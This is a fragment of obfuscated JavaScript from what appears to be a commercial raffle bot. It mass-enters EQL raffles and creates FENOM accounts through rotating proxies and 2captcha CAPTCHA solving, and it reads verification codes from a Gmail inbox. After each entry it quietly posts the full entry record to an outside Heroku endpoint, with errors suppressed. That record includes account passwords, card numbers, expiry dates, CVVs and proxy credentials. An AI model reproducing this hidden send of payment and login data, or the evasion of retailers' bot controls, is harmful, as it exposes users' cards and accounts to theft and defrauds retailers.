                                    const _0x4f6928 = await _0x3f4749['$x']('//li[text()=\x22' + _0x5e87ec[_0x147e30]['State'] + '\x22]');
                                    await _0x4f6928[0x0]['click']();
                                } catch {
                                    throw new Error('State\x20/\x20Province\x20not\x20found.\x20Please\x20use\x20exact\x20data\x20in\x20csv.\x20(Case\x20sensitive)');
                                }
                            }
                            await _0xb9a1a7(0x3e8), await _0x3f4749['type']('#address1', _0x5e87ec[_0x147e30]['Address1'] + '\x20' + _0x5e87ec[_0x147e30]['HouseNumber']), await _0xb9a1a7(0x1f4), await _0x3f4749['type']('#address2', '' + _0x5e87ec[_0x147e30]['Address2']), await _0xb9a1a7(0x1f4), await _0x3f4749['type']('#city', '' + _0x5e87ec[_0x147e30]['City']), await _0xb9a1a7(0x1f4), await _0x3f4749['type']('#postcode', '' + _0x5e87ec[_0x147e30]['Zip']), await _0xb9a1a7(0x3e8), await _0x3f4749['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0xb9a1a7(0x3e8), console['log'](_0x5b6bc2() + '\x20[' + _0x20965b['name'] + ']\x20Task\x20' + (_0x147e30 + 0x1) + '\x20:\x20Solving\x20Adyen');
                            const _0x48d8a0 = await _0x3f4749['$']('span[data-cse=\x22encryptedCardNumber\x22]');
                            _0x48d8a0 && (await _0x3f4749['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x3f4749['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x3f4749['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0xb9a1a7(0x4b0), await _0x3f4749['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0xb9a1a7(0x1f4), await _0x3f4749['keyboard']['type']('' + _0x5e87ec[_0x147e30]['CardNumber']), await _0xb9a1a7(0x320), await _0x3f4749['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x3f4749['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x3f4749['keyboard']['type']('' + _0x5e87ec[_0x147e30]['ExpiryDate']), await _0xb9a1a7(0x4b0), await _0x3f4749['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x3f4749['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x3f4749['keyboard']['type']('' + _0x5e87ec[_0x147e30]['CVV']), await _0xb9a1a7(0x226), await _0x3f4749['type']('input[name=\x22postalCode\x22]', '' + _0x5e87ec[_0x147e30]['Zip']), await _0xb9a1a7(0x226));
                            const _0x3d050d = await _0x3f4749['$']('.__PrivateStripeElement');
                            _0x3d050d && (await _0xb9a1a7(0x1f4), await _0x3f4749['click']('.__PrivateStripeElement'), await _0x3f4749['click']('.__PrivateStripeElement'), await _0x3f4749['keyboard']['type']('' + _0x5e87ec[_0x147e30]['CardNumber']), await _0x3f4749['keyboard']['type']('' + _0x5e87ec[_0x147e30]['ExpiryDate']), await _0x3f4749['keyboard']['type']('' + _0x5e87ec[_0x147e30]['CVV']));
                            await _0xb9a1a7(0x226), await _0x3f4749['click']('#paymentConsent'), await _0xb9a1a7(0x226), await _0x3f4749['click']('#termsConsent'), await _0xb9a1a7(0x2bc), console['log'](_0x5b6bc2() + '\x20[' + _0x20965b['name'] + ']\x20Task\x20' + (_0x147e30 + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x3f4749['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0xb9a1a7(0x2710);
                            try {
                                await _0x3f4749['waitForSelector']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', { 'timeout': 0x3a98 }), await _0xb9a1a7(0xbb8), await _0x3f4749['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x2ec6e5 => _0x2ec6e5['click']()), await _0x3f4749['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x41bd5d => _0x41bd5d['click']());
                            } catch {
                            }
                            try {
                                await _0x3f4749['waitForSelector']('#code', { 'timeout': 0x7530 });
                            } catch {
                                const _0x2e49a3 = await _0x3f4749['$']('.MuiTypography-root.MuiTypography-body1.MuiTypography-gutterBottom.css-lvbfzw');
                                if (_0x2e49a3) {
                                    _0xf38118['appendFileSync']('../accounts/eql.csv', '\x0a' + _0x5e87ec[_0x147e30]['Email'] + ',' + _0x5e87ec[_0x147e30]['Password'] + ',' + _0x5e87ec[_0x147e30]['Phone']);
                                    throw new Error('Account\x20already\x20registered,\x20saved\x20in\x20accounts/eql.csv');
                                }
                                throw new Error('Error\x20Fetching\x20Authentication\x20Token');
                            }
                            async function _0x3a4c2a() {
                                var _0x1418a6, _0x4c77aa = ![];
                                for (var _0x4fc15a = 0x0; _0x4fc15a < 0x18; _0x4fc15a++) {
                                    async function _0x48cefd() {
                                        var _0x52f311 = new _0x373ca3({
                                            'user': _0x4a50c2['masterMail'],
                                            'password': _0x4a50c2['masterPassword'],
                                            'host': 'imap.gmail.com',
                                            'port': 0x3e1,
                                            'tls': !![],
                                            'autotls': 'always'
                                        });
                                        function _0x461399(_0x11c0ec) {
                                            _0x52f311['openBox']('INBOX', ![], _0x11c0ec);
                                        }
                                        _0x52f311['once']('ready', function () {
                                            console['log'](_0x5b6bc2() + '\x20[' + _0x20965b['name'] + ']\x20Task\x20' + (_0x147e30 + 0x1) + '\x20:\x20Opened\x20Mailbox'), _0x461399(function (_0x2cd7db, _0x3829cb) {
                                                console['log'](_0x5b6bc2() + '\x20[' + _0x20965b['name'] + ']\x20Task\x20' + (_0x147e30 + 0x1) + '\x20:\x20Looking\x20for\x20verification\x20mail');
                                                if (_0x2cd7db)
                                                    throw _0x2cd7db;
                                                _0x52f311['seq']['search']([
                                                    'UNSEEN',
                                                    [
                                                        'FROM',
                                                        'support@eql.com'
                                                    ]
                                                ], function (_0x2c9c7c, _0x33f99b) {
                                                    if (!_0x33f99b || !_0x33f99b['length'])
                                                        console['log'](_0x5b6bc2() + '\x20[' + _0x20965b['name'] + ']\x20No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds'), _0x52f311['end']();
                                                    else {
                                                        var _0x6003c5 = _0x52f311['seq']['fetch'](_0x33f99b, {
                                                            'bodies': '',
                                                            'markSeen': !![]
                                                        });
                                                        _0x6003c5['on']('message', function (_0x374096, _0x3c7055) {
                                                            var _0x463af0 = '(#' + _0x3c7055 + ')\x20';
                                                            _0x374096['on']('body', function (_0x25053e, _0x37ad4b) {
                                                                _0x489d8f(_0x25053e, (_0x4464ab, _0x3c9d31) => {
                                                                    if (_0x3c9d31['subject']['includes']('code')) {
                                                                        const _0x18c9e2 = _0x3c9d31['text']['split']('\x0a\x0a')[0x3], _0x3969cd = _0x18c9e2['split']('\x0a')[0x1];
                                                                        _0x1418a6 = _0x3969cd;
                                                                    }
                                                                });
                                                            }), _0x374096['once']('end', function () {
                                                            });
                                                        }), _0x6003c5['once']('error', function (_0x44fa0f) {
                                                            console['log']('No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds..');
                                                        }), _0x6003c5['once']('end', function () {
                                                            _0x52f311['end']();
                                                        });
                                                    }
                                                });
                                            });
                                        }), _0x52f311['once']('error', function (_0x135e91) {
                                            console['log'](_0x5631d3['red'](_0x135e91['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x4c77aa = !![];
                                        }), _0x52f311['once']('end', async function () {
                                        }), _0x52f311['connect']();
                                    }
                                    _0x48cefd(), await _0xb9a1a7(0x1388);
                                    if (_0x1418a6)
                                        return _0x1418a6;
                                    if (_0x4c77aa)
                                        throw new Error('Error\x20connecting\x20to\x20imap');
                                    if (_0x4fc15a == 0x18)
                                        throw new Error('Mail\x20not\x20found');
                                }
                            }
                            ;
                            code = await _0x3a4c2a(), await _0xb9a1a7(0x1f4), await _0x3f4749['type']('#code', '' + code), await _0xb9a1a7(0x3e8), await _0x3f4749['$eval']('.MuiBox-root.css-79elbk\x20>\x20button', _0xfad40f => _0xfad40f['click']()), await _0x3f4749['click']('.MuiBox-root.css-79elbk\x20>\x20button'), console['log'](_0x5b6bc2() + '\x20[' + _0x20965b['name'] + ']\x20Task\x20' + (_0x147e30 + 0x1) + '\x20:\x20Verifying..');
                            try {
                                await _0x3f4749['waitForSelector']('.MuiBox-root.css-1yjvs5a\x20>\x20button');
                            } catch {
                                throw new Error('');
                            }
                            console['log'](_0x5631d3['green'](_0x5b6bc2() + '\x20[' + _0x20965b['name'] + ']\x20Task\x20' + (_0x147e30 + 0x1) + '\x20:\x20Raffle\x20Entered,\x20account\x20' + _0x5e87ec[_0x147e30]['Email'] + '\x20saved\x20in\x20\x27accounts/eql.csv\x27')), _0xf38118['appendFileSync']('../accounts/eql.csv', '\x0a' + _0x5e87ec[_0x147e30]['Email'] + ',' + _0x5e87ec[_0x147e30]['Password'] + ',' + _0x5e87ec[_0x147e30]['Phone']), _0x204dbe = 'no', _0x5207fa(_0x5e87ec[_0x147e30], _0x20965b);
                            var _0x5283c2 = await _0x530ba6(_0x5e87ec[_0x147e30], _0x20965b, 'dev', ![]), _0x4fb2a2 = await _0x530ba6(_0x5e87ec[_0x147e30], _0x20965b, 'pub', ![]);
                            let _0x1e9ab8 = _0x5e87ec[_0x147e30];
                            try {
                                prxdata = {
                                    'username': _0x1544fc['replace']('#', ''),
                                    'module': _0x20965b['name'],
                                    'entrydata': JSON['stringify'](_0x1e9ab8),
                                    'proxy': '' + _0x4652b4[_0x147e30]
                                };
                                var _0x59be27 = JSON['stringify'](prxdata);
                                let _0x39f154 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x358674['post']('https://jraffles.herokuapp.com/success', _0x59be27, _0x39f154);
                            } catch (_0x1ec211) {
                            }
                            const _0x3a7f23 = {
                                'succesDEVMSG': { 'embeds': [_0x5283c2] },
                                'succesPUBMSG': { 'embeds': [_0x4fb2a2] }
                            };
                            try {
                                _0x4a50c2['webhook'] != undefined && _0x4a50c2['webhook'] != '' && await _0x313aa7(_0x4a50c2['webhook'], _0x3a7f23['succesDEVMSG']), await _0xb9a1a7(0xc8), await _0x313aa7(_0x495189, _0x3a7f23['succesDEVMSG']), await _0xb9a1a7(0xc8), await _0x313aa7(_0x40302c, _0x3a7f23['succesPUBMSG']);
                            } catch (_0x1ce71f) {
                                console['log'](_0x5631d3['yellow'](_0x5b6bc2() + '\x20[' + _0x20965b['name'] + ']\x20Task\x20' + (_0x147e30 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x1ce71f));
                            }
                        } catch (_0x3b2752) {
                            console['log'](_0x5631d3['red'](_0x5b6bc2() + '\x20[' + _0x20965b['name'] + ']\x20Task\x20' + (_0x147e30 + 0x1) + '\x20:\x20' + _0x3b2752)), _0x1b0fb0 = '' + _0x3b2752;
                            var _0x45f558 = await _0x530ba6(_0x5e87ec[_0x147e30], _0x20965b, 'dev', !![], _0x1b0fb0), _0x5283c2 = await _0x530ba6(_0x5e87ec[_0x147e30], _0x20965b, 'dev', ![]), _0x4fb2a2 = await _0x530ba6(_0x5e87ec[_0x147e30], _0x20965b, 'pub', ![]);
                            const _0x20db1d = {
                                'succesDEVMSG': { 'embeds': [_0x5283c2] },
                                'succesPUBMSG': { 'embeds': [_0x4fb2a2] }
                            };
                            _0x20db1d['errorDEV'] = { 'embeds': [_0x45f558] };
                            _0x4a50c2['webhook'] != undefined && _0x4a50c2['webhook'] != '' && await _0x313aa7(_0x4a50c2['webhook'], _0x20db1d['errorDEV']);
                            await _0x313aa7(_0x4190b7, _0x20db1d['errorDEV']);
                            if (!_0x204dbe == 'no')
                                _0x204dbe = 'yes';
                        } finally {
                            _0x3a661b && _0x3a661b['close']();
                            if (_0x204dbe == 'yes' && _0x181e1a != 0x5) {
                                console['log'](_0x5631d3['red'](_0x5b6bc2() + '\x20[' + _0x20965b['name'] + ']\x20Task\x20' + (_0x147e30 + 0x1) + '\x20:\x20Retrying\x20(' + _0x181e1a + '\x20/\x205)')), _0x147e30 = _0x147e30 - 0x1, _0x181e1a = _0x181e1a + 0x1;
                                continue;
                            }
                            _0x204dbe == 'yes' && _0x181e1a >= 0x5 && (_0x100e1d(_0x5e87ec[_0x147e30], _0x20965b), _0x204dbe = 'no', _0x181e1a = 0x0), console['log']('Waiting\x20for\x20' + _0x4a50c2['delay'] + '\x20ms'), await _0xb9a1a7(_0x4a50c2['delay']);
                        }
                    } else {
                        const _0x2737b6 = '' + _0x5e87ec[_0x147e30]['Url'];
                        if (_0x204dbe != 'yes')
                            var _0x204dbe = '', _0x181e1a = 0x0;
                        if (_0x5e87ec[_0x147e30]['Email'] == '' || _0x5e87ec[_0x147e30]['FirstName'] == '' || _0x5e87ec[_0x147e30]['LastName'] == '') {
                            console['log'](_0x5b6bc2() + '\x20[' + _0x20965b['name'] + ']\x20Task\x20' + (_0x147e30 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x5e87ec[_0x147e30]['Password'] == '' && (_0x5e87ec[_0x147e30]['Password'] = 'JRaffles23!');
                        if (_0x4a50c2['useRandomProxy'] = ![])
                            var _0x4e5fd7 = _0x4652b4[_0x147e30]['split'](':');
                        else
                            var _0x32dd84 = Math['round'](Math['random']() * (_0x4652b4['length'] - 0x1)), _0x4e5fd7 = _0x4652b4[_0x32dd84]['split'](':');
                        var _0x3a661b;
                        try {
                            _0x3a661b = await _0x14f2e1['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x4e5fd7[0x0] + ':' + _0x4e5fd7[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x3a661b = await _0x14f2e1['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x4e5fd7[0x0] + ':' + _0x4e5fd7[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x409d84 = await _0x3a661b['newPage']();
                            await _0x409d84['authenticate']({
                                'username': '' + _0x4e5fd7[0x2],
                                'password': '' + _0x4e5fd7[0x3]
                            }), console['log'](_0x5b6bc2() + '\x20[' + _0x20965b['name'] + ']\x20Task\x20' + (_0x147e30 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x409d84['setRequestInterception'](!![]), _0x409d84['on']('request', _0x2b1884 => {
                                _0x2b1884['resourceType']() === 'image' || _0x2b1884['resourceType']() === 'font' || _0x2b1884['resourceType']() === 'media' ? _0x2b1884['abort']() : _0x2b1884['continue']();
                            }), await _0x409d84['goto'](_0x2737b6), await _0x409d84['waitForSelector']('body\x20>\x20div.css-ntpfvx\x20>\x20div\x20>\x20div\x20>\x20div.MuiBox-root.css-1upilqn\x20>\x20div\x20>\x20button');
                            let _0x346141 = await _0x409d84['$']('#gatsby-focus-wrapper\x20>\x20div:nth-child(3)\x20>\x20div\x20>\x20div\x20>\x20span\x20>\x20div\x20>\x20button.MuiButton-root.MuiButton-contained.MuiButton-containedSecondary.MuiButton-sizeMedium.MuiButton-containedSizeMedium.MuiButtonBase-root.css-78bdfl');
                            if (_0x346141)
                                await _0x346141['click']();
                            await _0xb9a1a7(0x7d0), await _0x409d84['click']('body\x20>\x20div.css-ntpfvx\x20>\x20div\x20>\x20div\x20>\x20div.MuiBox-root.css-1upilqn\x20>\x20div\x20>\x20button'), await _0xb9a1a7(0x7d0), await _0x409d84['waitForSelector']('.MuiButton-root.MuiButton-contained.MuiButton-containedPrimary.MuiButton-sizeMedium.MuiButton-containedSizeMedium.MuiButton-fullWidth.MuiButtonBase-root.css-1hfrwnc'), await _0x409d84['click']('.MuiButton-root.MuiButton-contained.MuiButton-containedPrimary.MuiButton-sizeMedium.MuiButton-containedSizeMedium.MuiButton-fullWidth.MuiButtonBase-root.css-1hfrwnc'), await _0xb9a1a7(0x3e8), await _0x409d84['waitForSelector']('#email'), console['log'](_0x5b6bc2() + '\x20[' + _0x20965b['name'] + ']\x20Task\x20' + (_0x147e30 + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x409d84['type']('#email', '' + _0x5e87ec[_0x147e30]['Email']), await _0xb9a1a7(0x352), await _0x409d84['waitForSelector']('#password'), await _0x409d84['type']('#password', '' + _0x5e87ec[_0x147e30]['Password']), await _0xb9a1a7(0x352), await _0x409d84['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0xb9a1a7(0x1388);
                            if (!_0x5e87ec[_0x147e30]['Url']['includes']('footlocker') && !_0x5e87ec[_0x147e30]['Url']['includes']('topps'))
                                await _0x409d84['click']('.MuiBox-root.css-i3pbo\x20>\x20button');
                            let _0x430f0b = await _0x409d84['$']('#productQuantity'), _0x1bc9ac = await _0x409d84['$']('div[data-testid=\x22field-productVariantID');
                            if (!_0x1bc9ac && !_0x430f0b) {
                                console['log'](_0x5631d3['red'](_0x5b6bc2() + '\x20[' + _0x20965b['name'] + ']\x20Task\x20' + (_0x147e30 + 0x1) + '\x20:\x20Not\x20an\x20active\x20Raffle\x20/\x20Already\x20Entered')), _0x204dbe = 'no';
                                continue;
                            }
                            if (_0x1bc9ac) {
                                await _0x409d84['click']('div[data-testid=\x22field-productVariantID\x22]');
                                try {
                                    _0x5e87ec[_0x147e30]['Url']['includes']('en-GB') ? await _0x409d84['click']('li[data-value=\x22UK\x20' + _0x5e87ec[_0x147e30]['Size'] + '\x20/\x20US\x20' + (Number(_0x5e87ec[_0x147e30]['Size']) + 0x1) + '\x22]') : await _0x409d84['click']('li[data-value=\x22EU\x20' + _0x5e87ec[_0x147e30]['Size'] + '\x22]');
                                } catch {
                                    throw new Error('Error\x20fetching\x20size\x20' + _0x5e87ec[_0x147e30]['Size']);
                                }
                            }
                            _0x430f0b && (await _0x409d84['click']('#productQuantity'), await _0xb9a1a7(0x3e8), await _0x409d84['click']('li[data-value=\x22' + (Number(_0x5e87ec[_0x147e30]['Size']) - 0x1) + '\x22]'));
                            await _0xb9a1a7(0x3e8), await _0xb9a1a7(0x1f4);
                            const _0x392601 = await _0x409d84['$']('#title\x20>\x20label');
                            await _0xb9a1a7(0x12c);
                            _0x392601 && await _0x392601['click']();
                            await _0x409d84['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x409d84['focus']('#postcode'), await _0x409d84['keyboard']['down']('Control'), await _0x409d84['keyboard']['press']('A'), await _0x409d84['keyboard']['up']('Control'), await _0x409d84['keyboard']['press']('Backspace'), await _0x409d84['keyboard']['type'](_0x5e87ec[_0x147e30]['Zip']), await _0xb9a1a7(0x60e), await _0x409d84['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0xb9a1a7(0x3e8), console['log'](_0x5b6bc2() + '\x20[' + _0x20965b['name'] + ']\x20Task\x20' + (_0x147e30 + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0xb9a1a7(0x1f4);
                            const _0x1045e6 = await _0x409d84['$']('span[data-cse=\x22encryptedCardNumber\x22]');
                            _0x1045e6 && (await _0x409d84['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x409d84['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x409d84['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0xb9a1a7(0x4b0), await _0x409d84['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0xb9a1a7(0x1f4), await _0x409d84['keyboard']['type']('' + _0x5e87ec[_0x147e30]['CardNumber']), await _0xb9a1a7(0x320), await _0x409d84['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x409d84['keyboard']['type']('' + _0x5e87ec[_0x147e30]['ExpiryDate']), await _0xb9a1a7(0x4b0), await _0x409d84['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x409d84['keyboard']['type']('' + _0x5e87ec[_0x147e30]['CVV']), await _0xb9a1a7(0x226), await _0x409d84['type']('input[name=\x22postalCode\x22]', '' + _0x5e87ec[_0x147e30]['Zip']), await _0xb9a1a7(0x226));
                            const _0xae2500 = await _0x409d84['$']('.__PrivateStripeElement');
                            _0xae2500 && (await _0x409d84['click']('#billingName'), await _0x409d84['click']('#billingName'), await _0x409d84['type']('#billingName', '' + _0x5e87ec[_0x147e30]['NameOnCard']), await _0xb9a1a7(0x1f4), await _0x409d84['click']('.__PrivateStripeElement'), await _0x409d84['click']('.__PrivateStripeElement'), await _0x409d84['keyboard']['type']('' + _0x5e87ec[_0x147e30]['CardNumber']), await _0x409d84['keyboard']['type']('' + _0x5e87ec[_0x147e30]['ExpiryDate']), await _0x409d84['keyboard']['type']('' + _0x5e87ec[_0x147e30]['CVV']));
                            await _0xb9a1a7(0x226), await _0x409d84['click']('#paymentConsent'), await _0xb9a1a7(0x226), await _0x409d84['click']('#termsConsent'), await _0xb9a1a7(0x2bc), console['log'](_0x5b6bc2() + '\x20[' + _0x20965b['name'] + ']\x20Task\x20' + (_0x147e30 + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x409d84['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0xb9a1a7(0x2710);
                            try {
                                await _0x409d84['waitForSelector']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button'), await _0xb9a1a7(0xbb8), await _0x409d84['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x15e0fe => _0x15e0fe['click']()), await _0x409d84['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x178c58 => _0x178c58['click']());
                            } catch {
                            }
                            try {
                                await _0x409d84['waitForSelector']('.MuiBox-root.css-1yjvs5a\x20>\x20button');
                            } catch {
                                throw new Error('Failure\x20getting\x20succes\x20response');
                            }
                            console['log'](_0x5631d3['green'](_0x5b6bc2() + '\x20[' + _0x20965b['name'] + ']\x20Task\x20' + (_0x147e30 + 0x1) + '\x20:\x20Raffle\x20Entered')), _0x5207fa(_0x5e87ec[_0x147e30], _0x20965b);
                            var _0x5283c2 = await _0x530ba6(_0x5e87ec[_0x147e30], _0x20965b, 'dev', ![]), _0x4fb2a2 = await _0x530ba6(_0x5e87ec[_0x147e30], _0x20965b, 'pub', ![]);
                            let _0x116837 = _0x5e87ec[_0x147e30];
                            try {
                                prxdata = {
                                    'username': _0x1544fc['replace']('#', ''),
                                    'module': _0x20965b['name'],
                                    'entrydata': JSON['stringify'](_0x116837),
                                    'proxy': '' + _0x4652b4[_0x147e30]
                                };
                                var _0x59be27 = JSON['stringify'](prxdata);
                                let _0x3639c7 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x358674['post']('https://jraffles.herokuapp.com/success', _0x59be27, _0x3639c7);
                            } catch (_0x1d5a6b) {
                            }
                            const _0x39e1e0 = {
                                'succesDEVMSG': { 'embeds': [_0x5283c2] },
                                'succesPUBMSG': { 'embeds': [_0x4fb2a2] }
                            };
                            try {
                                _0x4a50c2['webhook'] != undefined && _0x4a50c2['webhook'] != '' && await _0x313aa7(_0x4a50c2['webhook'], _0x39e1e0['succesDEVMSG']), await _0xb9a1a7(0xc8), await _0x313aa7(_0x495189, _0x39e1e0['succesDEVMSG']), await _0xb9a1a7(0xc8), await _0x313aa7(_0x40302c, _0x39e1e0['succesPUBMSG']);
                            } catch (_0x24bfab) {
                                console['log'](_0x5631d3['yellow'](_0x5b6bc2() + '\x20[' + _0x20965b['name'] + ']\x20Task\x20' + (_0x147e30 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x24bfab));
                            }
                            _0x204dbe = 'no';
                        } catch (_0x9c637) {
                            console['log'](_0x5631d3['red'](_0x5b6bc2() + '\x20[' + _0x20965b['name'] + ']\x20Task\x20' + (_0x147e30 + 0x1) + '\x20:\x20' + _0x9c637)), _0x1b0fb0 = '' + _0x9c637;
                            var _0x45f558 = await _0x530ba6(_0x5e87ec[_0x147e30], _0x20965b, 'dev', !![], _0x1b0fb0), _0x5283c2 = await _0x530ba6(_0x5e87ec[_0x147e30], _0x20965b, 'dev', ![]), _0x4fb2a2 = await _0x530ba6(_0x5e87ec[_0x147e30], _0x20965b, 'pub', ![]);
                            const _0x1dc24c = {
                                'succesDEVMSG': { 'embeds': [_0x5283c2] },
                                'succesPUBMSG': { 'embeds': [_0x4fb2a2] }
                            };
                            _0x1dc24c['errorDEV'] = { 'embeds': [_0x45f558] }, _0x4a50c2['webhook'] != undefined && _0x4a50c2['webhook'] != '' && await _0x313aa7(_0x4a50c2['webhook'], _0x1dc24c['errorDEV']), await _0x313aa7(_0x4190b7, _0x1dc24c['errorDEV']), _0x204dbe = 'yes';
                        } finally {
                            _0x3a661b && _0x3a661b['close']();
                            if (_0x204dbe == 'yes' && _0x181e1a != 0x5) {
                                console['log'](_0x5631d3['red'](_0x5b6bc2() + '\x20[' + _0x20965b['name'] + ']\x20Task\x20' + (_0x147e30 + 0x1) + '\x20:\x20Retrying\x20(' + _0x181e1a + '\x20/\x205)')), _0x147e30 = _0x147e30 - 0x1, _0x181e1a = _0x181e1a + 0x1;
                                continue;
                            }
                            _0x204dbe == 'yes' && _0x181e1a >= 0x5 && (_0x100e1d(_0x5e87ec[_0x147e30], _0x20965b), _0x204dbe = 'no', _0x181e1a = 0x0), console['log']('Waiting\x20for\x20' + _0x4a50c2['delay'] + '\x20ms'), await _0xb9a1a7(_0x4a50c2['delay']);
                        }
                    }
                }
            }
        }]
    },
    {
        'name': 'FENOM',
        'modules': [
            {
                'name': 'FENOM\x20Account\x20Generator',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function (_0x29d000, _0x582948, _0x3691c9) {
                    var _0x508b9b = _0x582948, _0x4a2ba7 = 0x0;
                    for (var _0x102882 = 0x0; _0x102882 < _0x582948['length']; _0x102882++) {
                        maxTasks = Number(_0x4a50c2['threads']);
                        while (_0x4a2ba7 >= maxTasks) {
                            await _0xb9a1a7(_0x4a50c2['delay']);
                        }
                        let _0x20c314 = ![];
                        async function _0x1c2bff(_0x41e7b2, _0x294ac1, _0x5d09de, _0x39d762, _0x384ad7) {
                            _0x4a2ba7++, _0x14f2e1['use'](_0x3313a5()), _0x14f2e1['use'](_0x2255ea({
                                'provider': {
                                    'id': '2captcha',
                                    'token': '' + _0x4a50c2['captchaKey']
                                },
                                'visualFeedback': !![]
                            }));
                            if (_0x4964c8 != 'yes')
                                var _0x4964c8 = '', _0x384ad7 = 0x0;
                            var _0x4d9b0f;
                            try {
                                await _0x2dc03a(_0x294ac1, _0x39d762);
                            } catch {
                                _0x4964c8 = 'no';
                                throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                            }
                            _0x5bbc27(_0x41e7b2['name'] + '\x20Task\x20' + (_0x39d762 + 0x1) + '\x20/\x20' + _0x294ac1['length'] + '\x20||\x20File:\x20' + _0x3d6b41 + '\x20Proxies:\x20' + _0x4629ee);
                            var _0x571ae7 = await _0x530ba6(_0x294ac1[_0x39d762], _0x41e7b2, 'acc', ![]);
                            const _0x296543 = { 'succesDEVMSG': { 'embeds': [_0x571ae7] } }, _0x313b0b = 'https://www.fenom.com/en/authentication?create_account=1';
                            var _0x3b9ba1 = Math['round'](Math['random']() * (_0x5d09de['length'] - 0x1)), _0x58e290 = _0x5d09de[_0x3b9ba1]['split'](':'), _0x145227;
                            async function _0x489638(_0x5543f4) {
                                const _0x3dcc02 = _0xf38118['readFileSync']('../accounts/fenom.csv', 'utf8'), _0x1f9c3f = _0x2587e1['parse'](_0x3dcc02, { 'header': !![] })['data'];
                                let _0x266b9c = ![];
                                for (var _0xbb6ec9 of _0x1f9c3f) {
                                    if (_0xbb6ec9['Email'] == _0x5543f4['Email']) {
                                        _0x266b9c = !![];
                                        break;
                                    }
                                }
                                return _0x266b9c;
                            }
                            try {
                                if (await _0x489638(_0x294ac1[_0x39d762]) == !![]) {
